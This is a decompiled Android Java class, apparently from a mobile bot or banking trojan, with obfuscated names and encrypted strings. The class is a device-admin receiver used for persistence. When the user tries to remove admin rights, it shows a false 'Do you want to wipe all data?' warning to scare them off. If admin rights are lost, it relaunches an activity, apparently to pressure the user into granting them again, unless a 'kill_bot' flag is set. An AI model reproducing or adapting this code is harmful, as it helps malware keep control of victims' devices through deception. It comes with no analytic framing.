package com.sonnokta;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

import com.sonnokta.utils.LogUtil;

import fddo.Cbreak;
import fddo.Cthrow;

public class p053u extends DeviceAdminReceiver {
    private static String TAG = "bwolf-p053v";

    public CharSequence onDisableRequested(Context context, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onDisableRequested ---");
        p023w p023w1 = p023w.f19while;
        if (p023w1 == null) {
            return "Do you want to wipe all data?";
        }
        p023w1.f21new.fddo();
        return "Do you want to wipe all data?";
    }

    public void onDisabled(Context context, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onDisabled ---");
        String fddo2 = Cbreak.fddo("5aa7c3433fcccdff6b3eb633687d2c1b");
        Boolean bool = Boolean.FALSE;
        Cthrow.m154case(context, fddo2, bool);
        if (!Cthrow.fddo(context, "kill_bot", bool).booleanValue()) {
            Cthrow.m159this(context, Cbreak.fddo("5fa1c64803ddf3ed64"), "admin");
            Intent intent2 = new Intent(context, p085x.class);
            intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
            context.startActivity(intent2);
        }
    }

    public void onEnabled(Context context, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onEnabled ---");
        Cthrow.m154case(context, Cbreak.fddo("5aa7c3433fcccdff6b3eb633687d2c1b"), Boolean.TRUE);
    }

    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        LogUtil.showErrorLog(TAG, "--- onReceive ---");
    }
}
